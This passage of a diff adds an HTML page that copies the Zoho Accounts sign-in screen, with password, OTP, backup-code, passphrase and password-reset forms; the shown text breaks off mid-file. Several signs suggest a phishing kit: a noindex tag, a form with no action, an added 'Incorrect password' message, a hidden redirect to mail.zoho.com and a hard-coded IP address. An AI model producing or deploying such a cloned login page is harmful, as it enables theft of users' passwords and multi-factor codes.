@@ -1,0 +1,1141 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta name="IE_Compatible" http-equiv="X-UA-Compatible" content="IE=edge">
+	<input type="hidden" name="lourl" value="https://mail.zoho.com" id="lourl">
+
+	<style type="text/css">
+		.signin_box {
+			width: 500px;
+			min-height: 520px;
+			height: auto;
+			background: #fff;
+			box-sizing: border-box;
+			padding: 50px 50px;
+			border-radius: 2px;
+			transition: all .1s ease-in-out;
+			float: left;
+			overflow-y: auto;
+			display: table-cell;
+			border-right: 2px solid #f1f1f1;
+		}
+
+		@media (min-width: 600px) and (max-width: 1024px) {
+			.signin_box {
+				width: 100%;
+				border-right: none;
+			}
+		}
+
+		@media only screen and (max-width: 600px) {
+			.signin_box {
+				width: 100%;
+				padding: 0px 30px;
+				height: auto;
+				border-right: none;
+			}
+		}
+
+		body {
+			margin: 0px;
+		}
+
+		.load-bg {
+			top: 0px
+		}
+
+		.darkmode .load-bg {
+			background-color: #191A23
+		}
+	</style>
+	
+
+	<meta name="robots" content="noindex, nofollow">
+	
+	<link href="signinnew.min.9c0379f1beebb0b0b1935f46c2803f2a.css" rel="stylesheet">
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=2.0">
+	<title>Zoho Accounts</title>
+	
+</head>
+
+<body>
+	<style>
+		.load-bg {
+			background-color: #FFFFFF;
+			width: 100%;
+			height: 100%;
+			position: absolute;
+			z-index: 100;
+			opacity: 1;
+			transition: opacity .2s linear;
+		}
+
+		.load-fade {
+			opacity: 0;
+		}
+
+		.basic-box-s {
+			display: block;
+			width: max-content;
+			height: max-content;
+			margin: auto;
+			position: relative;
+			top: 45%;
+		}
+
+		.box-anim {
+			animation: load-anim 2s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+		}
+
+		@keyframes load-anim {
+			0% {
+				transform: rotate(0deg);
+			}
+
+			10% {
+				transform: rotate(-30deg);
+			}
+
+			50% {
+				transform: rotate(180deg);
+			}
+
+			60% {
+				transform: rotate(165deg);
+			}
+
+			100% {
+				transform: rotate(360deg);
+			}
+		}
+
+		.path {
+			stroke-dasharray: 150px;
+			stroke-dashoffset: 150px;
+			stroke-linecap: round;
+		}
+
+		.path1-anim {
+			animation: stroke-anim1 4s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+		}
+
+		.path2-anim {
+			animation: stroke-anim2 4s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+		}
+
+		.path3-anim {
+			animation: stroke-anim3 4s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+		}
+
+		.path4-anim {
+			animation: stroke-anim4 4s cubic-bezier(0.83, -0.01, 0.22, 1) infinite;
+		}
+
+		@keyframes stroke-anim1 {
+			0% {
+				stroke-opacity: 1;
+				stroke-dashoffset: 150px;
+			}
+
+			3% {
+				stroke-dashoffset: 150px;
+			}
+
+			21%,
+			25% {
+				stroke-dashoffset: 0;
+			}
+
+			50% {
+				stroke-opacity: 1;
+			}
+
+			100% {
+				stroke-dashoffset: 0px;
+				stroke-opacity: 0;
+			}
+		}
+
+		@keyframes stroke-anim2 {
+			0% {
+				stroke-dashoffset: 150px;
+			}
+
+			25% {
+				stroke-opacity: 1;
+				stroke-dashoffset: 150px;
+			}
+
+			28% {
+				stroke-dashoffset: 150px;
+			}
+
+			46%,
+			50% {
+				stroke-dashoffset: 0px;
+			}
+
+			75% {
+				stroke-dashoffset: 0px;
+				stroke-opacity: 1;
+			}
+
+			100% {
+				stroke-dashoffset: 0px;
+				stroke-opacity: 0;
+			}
+		}
+
+		@keyframes stroke-anim3 {
+			0% {
+				stroke-opacity: 0;
+				stroke-dashoffset: 150px;
+			}
+
+			49% {
+				stroke-opacity: 0;
+			}
+
+			50% {
+				stroke-opacity: 1;
+				stroke-dashoffset: 150px;
+			}
+
+			53% {
+				stroke-dashoffset: 150px;
+			}
+
+			71%,
+			75% {
+				stroke-dashoffset: 0;
+			}
+
+			100% {
+				stroke-dashoffset: 0;
+				stroke-opacity: 1;
+			}
+		}
+
+		@keyframes stroke-anim4 {
+			0% {
+				stroke-dashoffset: 150px;
+				stroke-opacity: 0;
+			}
+
+			74% {
+				stroke-opacity: 1;
+			}
+
+			75% {
+				stroke-opacity: 1;
+				stroke-dashoffset: 150px;
+			}
+
+			78% {
+				stroke-dashoffset: 150px;
+			}
+
+			96%,
+			100% {
+				stroke-dashoffset: 0;
+			}
+		}
+	</style>
+
+	<div class="load-bg fade load-fade" style="display: none;">
+		<div class="basic-box-s box-anim">
+			<svg width="50" height="50" style="shape-rendering: geometricPrecision;" class="line_loader">
+				<rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path"
+					style="stroke: rgb(246, 177, 27); stroke-width: 5.4; stroke-opacity: 1; fill: transparent; stroke-dasharray: 384px; stroke-dashoffset: 0px">
+				</rect>
+				<rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path path1 path1-anim"
+					style="stroke: rgb(226, 39, 40); stroke-width: 5; stroke-opacity: 1; fill: transparent"></rect>
+				<rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path path2 path2-anim"
+					style="stroke: rgb(4, 152, 73); stroke-width: 5; stroke-opacity: 1; fill: transparent"></rect>
+				<rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path path3 path3-anim"
+					style="stroke: rgb(34, 110, 179); stroke-width: 5; stroke-opacity: 1; fill: transparent"></rect>
+				<rect x="5" y="5" rx="6" ry="6" width="40" height="40" class="path path4 path4-anim"
+					style="stroke: rgb(246, 177, 27); stroke-width: 5.4; stroke-opacity: 1; fill: transparent"></rect>
+			</svg>
+		</div>
+	</div>
+	<div class="bg_one"></div>
+	<div class="Alert"> <span class="tick_icon"></span> <span class="alert_message"></span> </div>
+	<div class="Errormsg">
+		<div style="position:relative;display:flex;align-items:center;"> <span class="error_icon"></span> <span
+				class="error_message"></span> <a class="error_help" href="#" onclick="closeTopErrNotification()"></a>
+			<div class="topErrClose hide" onclick="closeTopErrNotification()"></div>
+		</div>
+	</div>
+	<div class="container">
+		<div class="signin_container">
+			<div class="loader"></div>
+			<div class="blur_elem blur"></div>
+			<div class="signin_box" id="signin_flow">
+				<div class="smartsigninbutton hide" id="smartsigninbtn" onclick="openSmartSignInPage()">
+					<span class="ssibuttonqricon icon-SmartQR"></span>
+					<span>Try smart sign-in</span>
+					<span class="ssibuttonshineicon icon-shine"></span>
+				</div>
+				<div class="zoho_logo VirtualOffice"><img src="https://static.zohocdn.com/iam/v2/components/images/newZoho_logo.5f6895fcb293501287eccaf0007b39a5.svg" alt=""></div>
+				<div id="signin_div">
+					<form name="login" id="login" method="post"
+						novalidate="">
+						<div class="signin_head">
+							<span id="headtitle">Sign in</span>
+							<span id="trytitle"></span>
+							<div class="service_name">to access <span>Mail</span></div>
+							<div class="fielderror"></div>
+						</div>
+						<div class="fieldcontainer">
+							
+							<div class="getpassword" id="password_container">
+								<div class="hellouser">
+									<div class="username" id="emailich"></div>
+									<input type="hidden" name="email" id="email">
+									<span class="Notyou bluetext" onclick="resetForm()">Change</span>
+								</div>
+								<div class="textbox_div">
+									<input id="password" placeholder="Enter password" name="password" type="password"
+										class="textbox" required="" autocapitalize="none"
+										autocomplete="password" autocorrect="off" maxlength="250"><br/>
+										<span id="msg" style="color: red; display: none;">Incorrect password. Please try again.</span>
+									
+									<div class="fielderror"></div>
+									<div class="textbox_actions" id="enableotpoption" style="display: block;">
+										<span class="bluetext_action" id="signinwithotp"
+											onclick="showAndGenerateOtp()">Sign in using email OTP</span>
+										<span class="bluetext_action bluetext_action_right" id="blueforgotpassword"
+											onclick="goToForgotPassword();">Forgot Password?</span>
+									</div>
+									<div class="textbox_actions" id="enableforgot" style="display: none;">
+										<span class="bluetext_action bluetext_action_right" id="blueforgotpassword"
+											onclick="goToForgotPassword();">Forgot Password?</span>
+									</div>
+									<div class="textbox_actions_saml" id="enablesaml">
+										<span class="bluetext_action signinwithsaml" onclick="enableSamlAuth();">Sign in
+											using SAML</span>
+										<span class="bluetext_action bluetext_action_right" id="blueforgotpassword"
+											onclick="goToForgotPassword();">Forgot Password?</span>
+									</div>
+									<div class="textbox_actions_saml" id="enablejwt">
+										<a href="#" class="bluetext_action signinwithjwt">Sign in using JWT</a>
+										<span class="bluetext_action bluetext_action_right" id="blueforgotpassword"
+											onclick="goToForgotPassword();">Forgot Password?</span>
+									</div>
+								</div>
+							</div>
+							<div class="textbox_div" id="mfa_device_container">
+								<div class="devices">
+									<select class="secondary_devices" onchange="changeSecDevice(this);"></select>
+									<div class="deviceparent">
+										<span class="deviceinfo icon-device"></span>
+										<span class="devicetext"></span>
+									</div>
+								</div>
+								<div class="rnd_container">
+									<div id="rnd_num"></div>
+									<div class="bluetext_action rnd_resend resendotp"
+										onclick="javascript:return submitsignin($('#login'));">Resend Push</div>
+								</div>
+							</div>
+							<div id="otp_container">
+								<div class="hellouser">
+									<div class="username"></div>
+									<span class="Notyou bluetext" onclick="resetForm()">Change</span>
+								</div>
+								<div class="textbox_div">
+									<div id="otp" class="textbox" onkeypress="clearCommonError('otp')"></div>
+									<div class="fielderror"></div>
+									<div class="textbox_actions otp_actions">
+										<span class="bluetext_action" id="signinwithpass" onclick="showPassword()">Sign
+											in using password</span>
+										<span class="bluetext_action signinwithsaml" onclick="enableSamlAuth();"
+											style="display: none;">Sign in using SAML</span>
+										<a href="#" class="bluetext_action signinwithjwt" style="display: none;">Sign in
+											using JWT</a>
+										<span class="bluetext_action showmoresigininoption"
+											onclick="showmoresigininoption()" style="display: none;">Sign in another
+											way</span>
+										<span class="bluetext_action bluetext_action_right resendotp"
+											onclick="generateOTP(true);clearCommonError('otp');clearFieldValue('otp')">Resend
+											OTP</span>
+									</div>
+								</div>
+							</div>
+							<div class="textbox_div" id="mfa_otp_container">
+								<div id="mfa_otp" class="textbox" onkeypress="clearCommonError('mfa_otp')"></div>
+								<div class="fielderror"></div>
+								<div class="textbox_actions">
+									<span class="bluetext_action bluetext_action_right resendotp"
+										onclick="generateOTP(true)">Resend OTP</span>
+								</div>
+							</div>
+							<div class="textbox_div" id="mfa_email_container">
+								<div id="mfa_email" class="textbox" onkeypress="clearCommonError('mfa_email')"></div>
+								<div class="fielderror"></div>
+								<div class="textbox_actions">
+									<span class="bluetext_action bluetext_action_right resendotp"
+										onclick="generateOTP(true)">Resend OTP</span>
+								</div>
+							</div>
+							<div class="textbox_div" id="mfa_totp_container">
+								<div id="mfa_totp" class="textbox" onkeypress="clearCommonError('mfa_totp')"></div>
+								<div class="fielderror"></div>
+							</div>
+
+							<div class="qrcodecontainer" id="mfa_scanqr_container">
+								<span class="qr_before"></span>
+								<img id="qrimg" src="">
+								<span class="qr_after"></span>
+							</div>
+							<div class="textbox_div" id="captcha_container" style="display: none;">
+								<input id="captcha" placeholder="Enter CAPTCHA" type="text" name="captcha"
+									class="textbox" required="" onkeypress="clearCommonError('captcha')"
+									autocapitalize="none" autocomplete="off" autocorrect="off" maxlength="8">
+								<div id="captcha_img" name="captcha" class="textbox"></div>
+								<span class="reloadcaptcha icon-Reload" onclick="changeHip()"></span>
+								<div class="fielderror"></div>
+							</div>
+							<div id="yubikey_container">
+								<div class="fielderror"></div>
+							</div>
+							<button class="btn blue waitbtn" id="waitbtn">
+								<span class="loadwithbtn"></span>
+								<span class="waittext">Waiting for approval</span>
+							</button>
+						</div>
+						<div class="textbox_actions_more" id="enablemore">
+							<span class="bluetext_action showmoresigininoption" onclick="showmoresigininoption()">Sign
+								in another way</span>
+							<span class="bluetext_action bluetext_action_right blueforgotpassword"
+								id="blueforgotpassword" onclick="goToForgotPassword();">Forgot Password?</span>
+							<span class="bluetext_action bluetext_action_right resendotp" id="resendotp"
+								onclick="generateOTP(true)">Resend OTP</span>
+
+							<div id="enableoptionsoneauth">
+								<span class="signinoptiononeauth" id="signinwithpassoneauth"
+									onclick="showPassword()">Sign in using password</span>
+								<span class="signinoptiononeauth" id="passlessemailverify"
+									onclick="showAndGenerateOtp('email')"></span>
+								<span class="signinoptiononeauth" id="signinwithotponeauth"
+									onclick="showAndGenerateOtp('otp')"></span>
+								<span class="signinwithsamloneauth signinoptiononeauth" onclick="enableSamlAuth();">Sign
+									in using SAML</span>
+								<span class="signinwithfedoneauth signinoptiononeauth"
+									onclick="showMoreFedOptions();">Sign in using linked accounts</span>
+								<a href="#" class="signinwithjwtoneauth signinoptiononeauth">Sign in using JWT</a>
+							</div>
+						</div>
+						<div class="addaptivetfalist">
+							<div class="signin_head verify_title">Sign in another way</div>
+							<div class="optionstry optionmod" id="trytotp" onclick="tryAnotherway('totp')">
+								<div class="img_option_try img_option icon-totp"></div>
+								<div class="option_details_try">
+									<div class="option_title_try">Offline TOTP verification</div>
+									<div class="option_description try_option_desc">Open OneAuth, tap <span
+											class="trydesc">Sign in another way</span>, and enter it here to verify your
+										sign-in.</div>
+								</div>
+								<div class="mfa_totp_verify verify_totp" id="verify_totp_container">
+									<div id="verify_totp" name="MFATOTP" class="textbox"
+										onkeypress="clearCommonError('verify_totp')"></div>
+									<button class="btn blue" id="totpverifybtn" tabindex="2">
+										<span class="loadwithbtn"></span>
+										<span class="waittext">Verify</span>
+									</button>
+									<div class="fielderror"></div>
+								</div>
+							</div>
+							<div class="optionstry optionmod" id="tryscanqr" onclick="tryAnotherway('qr')">
+								<div class="img_option_try img_option icon-qr"></div>
+								<div class="option_details_try">
+									<div class="option_title_try">Scan QR verification</div>
+									<div class="option_description try_option_desc">Open OneAuth and tap <span
+											class="trydesc">Sign in another way</span>. Tap <span class="trydesc">Scan
+											QR instead</span> to open code scanner. Scan the below code to verify
+										sign-in.</div>
+								</div>
+								<div class="verify_qr" id="verify_qr_container">
+									<div class="qrcodecontainer">
+										<div>
+											<span class="qr_before"></span>
+											<img id="verify_qrimg" src="">
+											<span class="qr_after"></span>
+											<div class="loader"></div>
+											<div class="blur_elem blur"></div>
+										</div>
+									</div>
+								</div>
+							</div>
+							<span class="close_icon error_icon" onclick="hideTryanotherWay()"></span>
+							<div class="text16 pointer nomargin" id="recoverybtn_mob" onclick="showCantAccessDevice()">
+								Can't access your device?</div>
+							<div class="text16 pointer nomargin" id="problemsignin_mob" onclick="showproblemsignin()">
+								Problem signing in?</div>
+						</div>
+						<div id="problemsigninui"></div>
+
+						<button class="btn blue" id="submit-btn" tabindex="2"><span class="">Sign in</span></button>
+						<div class="btn borderless" onclick="hideBackupOptions()">Back</div>
+						<div class="text16 pointer nomargin" id="recoverybtn" onclick="showCantAccessDevice()">Can't
+							access your device?</div>
+						<div class="text16 pointer nomargin" id="problemsignin" onclick="showproblemsignin()">Problem
+							signing in?</div>
+						<div class="tryanother text16" onclick="showTryanotherWay()">Sign in another way</div>
+						<div class="text16" id="forgotpassword" style="display: none;"><a class="text16" href="#"
+								onclick="goToForgotPassword();">Forgot Password?</a></div>
+					</form>
+					<div class="externaluser_container"></div>
+					<button class="btn blue" id="continuebtn"
+						onclick="handleLookupDetails(JSON.stringify(deviceauthdetails),true);return false"><span>Continue</span></button>
+					<div id="recovery_container">
+						<div class="signin_head recoveryhead">
+							<span class="icon-backarrow backoption" onclick="goBackToProblemSignin()"></span><span
+								class="rec_head_text">Can't access your device?</span>
+							<table id="recoverytitle"></table>
+						</div>
+						<div id="recoverymodeContainer"></div>
+						<div class="recoverymodes">
+							<div class="options options_hover" id="recoverOption"
+								onclick="showBackupVerificationCode()">
+								<div class="img_option icon-backup"></div>
+								<div class="option_details">
+									<div class="option_title">Use backup verification code</div>
+									<div class="option_description">Backup verification codes are 12-digit codes that
+										are given to you when you set up multi-factor authentication.</div>
+								</div>
+							</div>
+							<div class="options options_hover" id="passphraseRecover"
+								onclick="showPassphraseContainer()">
+								<div class="img_option icon-saml"></div>
+								<div class="option_details">
+									<div class="option_title">Sign in using passphrase</div>
+									<div class="option_description">Use passphrase to sign in to your OneAuth app</div>
+								</div>
+							</div>
+							<div class="options contact_support">
+								<div class="img_option icon-support"></div>
+								<div class="option_details">
+									<div class="option_title">Contact Support</div>
+									<div class="option_description contactsuprt">Please send us an email at <a
+											href="mailto:support@zohoaccounts.com"
+											style="color:#696969;text-decoration:none;">support@zohoaccounts.com</a>
+										describing your issue so we can assist you.</div>
+								</div>
+							</div>
+						</div>
+						<div class="btn greytext"></div>
+					</div>
+					<form id="backup_container" onsubmit="javascript:return verifyBackupCode()" novalidate="">
+						<div class="signin_head backuphead">
+							<span id="backup_title"><span class="icon-backarrow backoption"
+									onclick="showCantAccessDevice()"></span>Use backup verification code</span>
+							<div class="backup_desc extramargin">Backup verification codes are 12-digit codes that are
+								given to you when you set up multi-factor authentication.</div>
+						</div>
+						<div class="textbox_div" id="backupcode_container">
+							<input id="backupcode" placeholder="Backup verification code" type="text" name="backupcode"
+								class="textbox" required="" onkeypress="clearCommonError('backupcode')"
+								onkeyup="submitbackup(event)" autocapitalize="none" autocomplete="off" autocorrect="off"
+								maxlength="15">
+							<div class="fielderror"></div>
+							<span class="bluetext_action" id="recovery_passphrase"
+								onclick="changeRecoverOption('passphrase')">Sign in using passphrase</span>
+						</div>
+						<div class="textbox_div" id="passphrase_container">
+							<input id="passphrase" placeholder="Enter passphrase" type="password" name="PASSPHRASE"
+								class="textbox" required="" onkeypress="clearCommonError('passphrase')"
+								autocapitalize="none" autocomplete="off" autocorrect="off">
+							<span class="icon-hide show_hide_password" onclick="showHidePassword();"></span>
+							<div class="fielderror"></div>
+							<span class="bluetext_action" id="recovery_backup"
+								onclick="changeRecoverOption('recoverycode')">Sign in using backup codes</span>
+						</div>
+						<div class="textbox_div" id="bcaptcha_container" style="display: none;">
+							<input id="bcaptcha" placeholder="Enter CAPTCHA" type="text" name="captcha" class="textbox"
+								required="" onkeypress="clearCommonError('bcaptcha')" onkeyup="submitbackup(event)"
+								autocapitalize="none" autocomplete="off" autocorrect="off" maxlength="8">
+							<div id="bcaptcha_img" name="captcha" class="textbox"></div>
+							<span class="reloadcaptcha" onclick="changeHip('bcaptcha_img','bcaptcha')"> </span>
+							<div class="fielderror"></div>
+						</div>
+						<button class="btn blue">Verify</button>
+						<div class="btn borderlessbtn back_btn"></div>
+					</form>
+					<form id="emailcheck_container" onsubmit="javascript:return verifyEmailValid();" novalidate="">
+						<div class="signin_head emailcheck_head">
+							<span id="backup_title"><span class="icon-backarrow backoption"
+									onclick="hideEmailOTPInitiate()"></span>Sign-in via email OTP</span>
+							<div class="backup_desc extramargin" id="emailverify_desc">Please enter your registered
+								email address <b>{0}</b> to receive the OTP.</div>
+						</div>
+						<div class="textbox_div" id="emailvalidate_container">
+							<input id="emailcheck" placeholder="Enter email address" name="EMAILCHECK" type="email"
+								class="textbox" required="" onkeypress="clearCommonError('emailcheck')"
+								autocapitalize="none" autocomplete="on" autocorrect="off" maxlength="250">
+							<div class="fielderror"></div>
+						</div>
+						<button class="btn blue">Next</button>
+					</form>
+					<form id="emailverify_container" onsubmit="javascript:return verifyEmailOTP();" novalidate="">
+						<div class="signin_head emailverify_head">
+							<span id="backup_title"><span class="icon-backarrow backoption"
+									onclick="hideEmailOTPVerify()"></span>Sign-in via email OTP</span>
+							<div class="backup_desc extramargin" id="emailverify_desc">Please enter your registered
+								email address <b>{0}</b> to receive the OTP.</div>
+						</div>
+						<div class="textbox_div" id="emailotpverify_container">
+							<div id="emailverify" class="textbox" onkeypress="clearCommonError('emailverify')"></div>
+							<div class="fielderror"></div>
+						</div>
+
+						<span class="bluetext_action" id="signinwithpass" onclick="showPassword()">Sign in using
+							password</span>
+						<span class="bluetext_action signinwithsaml" onclick="enableSamlAuth();">Sign in using
+							SAML</span>
+						<a href="#" class="bluetext_action signinwithjwt">Sign in using JWT</a>
+						<span class="bluetext_action bluetext_action_right resendotp resendotp_mb"
+							onclick="generateOTP(true)">Resend OTP</span>
+						<div class="textbox_actions_more" id="enablemore">
+							<span class="bluetext_action showmoresigininoption"
+								onclick="showmoresigininoption('getbackemailverify');">Sign in another way</span>
+							<span class="bluetext_action bluetext_action_right blueforgotpassword"
+								id="blueforgotpassword" onclick="goToForgotPassword();">Forgot Password?</span>
+							<span class="bluetext_action bluetext_action_right resendotp" id="resendotp"
+								onclick="generateOTP(true)">Resend OTP</span>
+						</div>
+						<button class="btn blue">Verify</button>
+					</form>
+					<div>
+					</div>
+					<div class="line" style="display: none;">
+						<span class="line_con">
+							<span>Or</span>
+						</span>
+					</div>
+					<div class="fed_2show" style="display: none;">
+						<div class="signin_fed_text">Sign in using</div>
+						<span class="fed_div apple_normal_icon apple_fed small_box show_fed" id="macappleicon"
+							onclick="createandSubmitOpenIDForm('apple');" title="Sign in using Apple"
+							style="display: inline-block;">
+							<div class="fed_center_apple">
+								<span class="icon-apple_small fedicon"></span>
+								<span class="fed_text" style="display: none;">Sign in with Apple</span>
+							</div>
+						</span>
+						<span class="fed_div google_icon google_fed small_box"
+							onclick="createandSubmitOpenIDForm('google');" title="Sign in using Google"
+							style="display: inline;">
+							<div class="fed_center_google">
+								<span class="fed_google_large">
+									<span class="icon-google_small fedicon">
+										<span class="path1"></span><span class="path2"></span><span
+											class="path3"></span><span class="path4"></span>
+									</span>
+								</span>
+								<span class="fed_text largeGoogleText" style="display: none;">Sign in with Google</span>
+								<span class="fed_text smallGoogleText" style="display: none;">Google</span>
+							</div>
+						</span>
+						<span class="fed_div yahoo_icon yahoo_fed small_box"
+							onclick="createandSubmitOpenIDForm('yahoo');" title="Sign in using Yahoo"
+							style="display: inline;">
+							<div class="fed_center">
+								<div class="icon-yahoo_small fedicon yahooicon"></div>
+								<span class="fed_text" style="display: none;">Sign in with Yahoo</span>
+							</div>
+						</span>
+						<span class="fed_div fb_fed_box facebook_fed small_box"
+							onclick="createandSubmitOpenIDForm('facebook');" title="Login with Facebook"
+							style="display: inline;">
+							<div class="fed_center">
+								<div class="icon-facebook_small fedicon"></div>
+								<span class="fed_text" style="display: none;">Login with Facebook</span>
+							</div>
+						</span>
+						<span class="fed_div linkedin_fed_box linkedin_fed small_box"
+							onclick="createandSubmitOpenIDForm('linkedin');" title="Sign in using Linkedin"
+							style="display: inline;">
+							<div class="fed_center_linkedIn">
+								<span class="icon-linkedin_small fedicon linkedicon"></span>
+							</div>
+						</span>
+						<span class="fed_div twitter_fed_box twitter_fed small_box"
+							onclick="createandSubmitOpenIDForm('twitter');" title="Sign in using Twitter"
+							style="display: inline;">
+							<div class="fed_center">
+								<span class="icon-twitter_small fedicon"></span>
+								<span class="fed_text" style="display: none;">Sign in with Twitter</span>
+							</div>
+						</span>
+						<span class="fed_div MS_icon azure_fed small_box" onclick="createandSubmitOpenIDForm('azure');"
+							title="Sign in using Microsoft" style="display: inline;">
+							<div class="fed_center">
+								<span class="icon-azure_small fedicon">
+									<span class="path1"></span><span class="path2"></span><span
+										class="path3"></span><span class="path4"></span>
+								</span>
+								<span class="fed_text" style="display: none;">Sign in with Microsoft</span>
+							</div>
+						</span>
+						<span class="fed_div slack_icon slack_fed small_box"
+							onclick="createandSubmitOpenIDForm('slack');" title="Sign in using Slack"
+							style="margin: 0px; display: inline;">
+							<div class="fed_center">
+								<div class="icon-slack_small fedicon slackicon">
+									<span class="path1"></span><span class="path2"></span><span
+										class="path3"></span><span class="path4"></span>
+								</div>
+								<span class="fed_text" style="display: none;">Sign in with Slack</span>
+							</div>
+						</span>
+
+
+						<div class="zohosignin hide" onclick="showZohoSignin()">Sign in with Zoho<span
+								class="fedarrow"></span></div>
+					</div>
+				</div>
+				<div class="nopassword_container">
+					<div class="nopassword_icon icon-hint"></div>
+					<div class="nopassword_message">You have not set a password for this account <a
+							href="javascript:goToForgotPassword();">Set password now</a>.</div>
+				</div>
+				<div class="go_to_bk_code_container">
+					<div class="close_btn" onclick="hideBkCodeRedirection()"></div>
+					<div class="nopassword_icon icon-hint"></div>
+					<div class="backup_info_tab">
+						<div style="font-size:12px;font-weight:500;">Try Backup Verification Code</div>
+						<div style="margin-top: 5px;color: #000000BF;">If you are unable to sign in using SMS-based OTP,
+							you can use backup verification codes to sign in.</div>
+					</div>
+					<div class="button_parent"><span class="backup_action" onclick="showBackupVerificationCode()">Try
+							Now</span></div>
+				</div>
+				<div class="password_expiry_container">
+					<div class="passexpsuccess"></div>
+					<div class="signin_head">
+						<span id="headtitle">Password expired</span>
+						<div class="pass_name extramargin" id="password_desc"></div>
+					</div>
+					<div class="textbox_div" id="npassword_container">
+						<input id="new_password" onkeyup="setPassword(event)" placeholder="Enter new password"
+							name="newPassword" type="password" class="textbox" required=""
+							onkeypress="clearCommonError('password')" autocapitalize="none" autocomplete="password"
+							autocorrect="off">
+						<span class="icon-hide show_hide_password" onclick="showHidePassword();"></span>
+						<div class="fielderror"></div>
+					</div>
+					<div class="textbox_div" id="rpassword_container">
+						<input id="new_repeat_password" onkeyup="setPassword(event)" placeholder="Confirm Password"
+							name="cpwd" type="password" class="textbox" required=""
+							onkeypress="clearCommonError('password')" autocapitalize="none" autocomplete="password"
+							autocorrect="off">
+					</div>
+					<button class="btn blue" id="changepassword" onclick="updatePassword();"><span>Set
+							password</span></button>
+				</div>
+
+				<div class="resetIP_container">
+					<div class="hellouser">
+						<div class="username"></div>
+						<span class="Notyou bluetext" onclick="resetForm(true)">Change</span>
+					</div>
+
+					<div class="signin_head">
+						<span id="headtitle">IP address not allowed</span>
+						<div class="pass_name extramargin" id="ip_desc">You're not allowed to sign in from your current
+							IP address <b>(102.88.35.223)</b>, as per the restriction configured for your account. <a
+								style="color:#0091FF; text-decoration:none;"
+								href="https://help.zoho.com/portal/en/kb/accounts/faqs-troubleshooting/troubleshooting/sign-in/articles/you-are-not-allowed-to-sign-in-using-this-ip-address">Learn
+								why?</a></div>
+					</div>
+					<div class="text16 pointer nomargin" id="goto_resetIP" onclick="goToForgotPassword(true);">Remove IP
+						restriction?</div>
+				</div>
+
+
+				<div class="terminate_session_container">
+					<div class="signin_head">
+						<span id="headtitle">Terminate Sessions</span>
+						<div class="pass_name extramargin" id="password_desc">Apart from changing your password, you can
+							perform the following action if you feel your account is compromised.</div>
+					</div>
+					<form id="terminate_session_form" name="terminate_session_container"
+						onsubmit="return send_terminate_session_request(this);" novalidate="">
+						<div class="checkbox_div" id="terminate_web_sess" style="padding: 10px;margin-top:10px;">
+							<input id="termin_web" name="signoutfromweb" class="checkbox_check" type="checkbox">
+							<span class="checkbox">
+								<span class="checkbox_tick"></span>
+							</span>
+							<label for="termin_web" class="session_label">
+								<span class="checkbox_label">Terminate all the browsers sessions.</span>
+								<span id="terminate_session_web_desc" class="session_terminate_desc">This will sign you
+									out of all your Zoho account sessions that are active in browsers.</span>
+							</label>
+						</div>
+						<div class="checkbox_div" id="terminate_mob_apps" style="padding: 10px;margin-top:10px">
+							<input id="termin_mob" name="signoutfrommobile" class="checkbox_check" type="checkbox"
+								onchange="showOneAuthTerminate(this)">
+							<span class="checkbox">
+								<span class="checkbox_tick"></span>
+							</span>
+							<label for="termin_mob" class="session_label big_checkbox_label">
+								<span class="checkbox_label">Terminate all the desktop and mobile app sessions.</span>
+								<span id="terminate_session_weband_mobile_desc" class="session_terminate_desc">This will
+									sign you out of all the Zoho apps that are installed on devices. You will need to
+									sign in to them again.</span>
+							</label>
+						</div>
+						<div class="oneAuthLable">
+							<div class="oneauthdiv">
+								<span class="oneauth_icon one_auth_icon_v2"></span>
+								<span class="text_container">
+									<div class="text_header">Include OneAuth</div>
+									<div class="text_desc">If enabled, you need to verify your new password in OneAuth
+										app installed on your Primary Device.</div>
+								</span>
+								<div class="togglebtn_div include_oneAuth_button">
+									<input class="real_togglebtn" id="include_oneauth" type="checkbox">
+									<div class="togglebase">
+										<div class="toggle_circle"></div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<div class="checkbox_div" id="terminate_api_tok" style="padding: 10px;margin-top:10px">
+							<input id="termin_api" name="signoutfromapiToken" class="checkbox_check" type="checkbox">
+							<span class="checkbox">
+								<span class="checkbox_tick"></span>
+							</span>
+							<label for="termin_api" class="session_label big_checkbox_label">
+								<span class="checkbox_label">Revoke connected app's access to your account.</span>
+								<span id="terminate_session_web_desc_apitoken" class="session_terminate_desc">This
+									will revoke all the permissions you’ve granted to any third-party
+									apps/extensions for fetching information from your account.</span>
+							</label>
+						</div>
+						<button class="btn blue checkbox_mod"
+							id="terminate_session_submit"><span>Continue</span></button>
+					</form>
+				</div>
+				<div class="trustbrowser_ui">
+					<div class="signin_head">
+						<span id="headtitle">Trust this browser?</span>
+						<div class="service_name mod_sername"></div>
+					</div>
+					<button class="btn blue trustdevice trustbtn" onclick="updateTrustDevice(true)">
+						<span class="loadwithbtn"></span>
+						<span class="waittext">Trust</span>
+					</button>
+					<button class="btn grey trustdevice notnowbtn" onclick="updateTrustDevice(false)">
+						<span class="loadwithbtn"></span>
+						<span class="waittext">Not now</span>
+					</button>
+				</div>
+				<div id="restict_signin">
+					<div class="signin_head restrict_head">Access denied</div>
+					<div class="restrict_icon"></div>
+					<div class="restrict_desc service_name">You've enabled Restrict Sign-in for your Zoho account. You
+						can disable it in the OneAuth app.</div>
+					<button class="btn blue trybtn" id="restict_btn" tabindex="2" onclick="window.location.reload()">Try
+						again</button>
+				</div>
+			</div>
+
+			<div class="rightside_box">
+				<div class="mfa_panel hide" style="display: none;">
+					<div class="product_img" id="product_img"></div>
+					<div class="product_head">Keep your account secure</div>
+					<div class="product_text">Zoho OneAuth is our new in-house multi-factor authentication app. Shield
+						your Zoho account with <a style="color:#309FF4;text-decoration:none;"
+							href="https://www.zoho.com/accounts/oneauth.html?utm_source=tfa-banner-accounts&amp;utm_medium=web&amp;utm_campaign=oenauth-ms"
+							target="_blank">OneAuth</a> now.</div>
+				</div>
+				<div class="overlapBanner" style="width: 300px; display: block;">
